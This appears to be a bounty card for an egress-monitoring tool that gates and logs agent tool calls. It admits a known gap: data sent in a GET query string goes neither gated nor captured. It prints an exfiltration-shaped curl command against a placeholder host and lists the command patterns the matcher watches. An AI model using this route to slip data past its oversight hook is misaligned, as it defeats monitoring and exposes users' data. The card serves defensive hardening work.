# LOTOR-C1 — Data leaves in a GET query string, ungated and uncaptured

**State:** open
**Difficulty:** medium
**Touches:** the egress matcher (`src/policy`), shared by both the `egress-other`
gate and the `PostToolUse` capture hook
**Source:** KNOWN-LIMITS item 2

## The confession

Lotor captures and gates egress-shaped tool calls by matching the command: it
knows `curl -d`, `wget --post-data`, `Invoke-RestMethod`, remote git operations,
publish commands. The same matchers drive both the capture hook and the
`egress-other` gate, so a gap in one is a gap in the other.

Here is the gap, stated plainly because it is mine to state. A plain GET that
carries data in its query string:

```
curl https://host/collect?data=<whatever-you-want-to-exfiltrate>
```

is neither gated nor captured. There is no `--post` flag to match on, and gating
every query-string GET would fire on ordinary API reads, which is most of what
GET is for. So the honest hole is that data can leave the machine in a URL and
Lotor sees nothing. A clean receipt and a missed exfiltration look identical
here.

This is why the README says egress capture must not be read as complete. It is
not a claim I am walking back. It is one I am publishing a bounty against.

## Scope

**In bounds:**

- A design or matcher change that gates or captures data-carrying GET egress
  without firing on ordinary API reads. The hard half is the discrimination, not
  the detection.
- A demonstration of another egress form the current matchers do not recognize,
  with the same acceptance shape below. Finding a second hole is as valuable as
  closing the first.

**Out of bounds:**

- "Gate all GETs." That trades a false-negative for a false-positive flood and
  makes the gate the thing people turn off. If your answer fires on
  `curl https://api.github.com/repos/...`, it is not a fix.
- Wire-level capture (a network proxy, TLS interception). That is a larger
  architectural change, named as not-in-v1, and is a different project than this
  card.

## Acceptance

A real fix shows all of:

1. A runnable command that sends data off-machine via a GET query string, and a
   before/after: it produces no `egress-*` receipt today, and does after your
   change.
2. A test proving your discrimination holds: at least three ordinary
   data-carrying reads (a GitHub API call, a package registry query, a search
   endpoint) that must **not** trip the new rule, and at least three exfil-shaped
   GETs that must.
3. The false-positive rate stated honestly. If your rule has edge cases it fires
   on, they go in the PR, in the KNOWN-LIMITS voice, not hidden.
4. A signed Lotor receipt of the session you did the work in.

Check your own work against 1 and 2 before you submit. If it passes both, you
have closed it whether or not I have looked yet.

## What you get

Attribution on the close, credit in CHANGELOG, and standing to claim the harder
cards. This is the honest hole the README names by hand; closing it well is the
most legible proof possible that the confession log is a working board and not a
pose.
